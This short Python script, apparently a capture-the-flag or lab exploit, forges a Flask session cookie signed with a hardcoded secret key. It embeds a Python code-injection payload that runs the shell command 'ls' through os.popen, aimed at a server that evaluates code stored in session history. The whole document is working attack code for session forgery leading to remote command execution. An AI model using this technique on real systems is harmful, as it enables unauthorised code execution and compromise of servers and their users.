from flask.sessions import SecureCookieSessionInterface
secret_key = "cded826a1e89925035cc05f0907855f7"
class FakeApp:
    secret_key = secret_key


fake_app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(fake_app)
payload = serializer.dumps(
    {"history": [{"code": '__import__("os").popen("ls").read()'}]}
)
print(payload)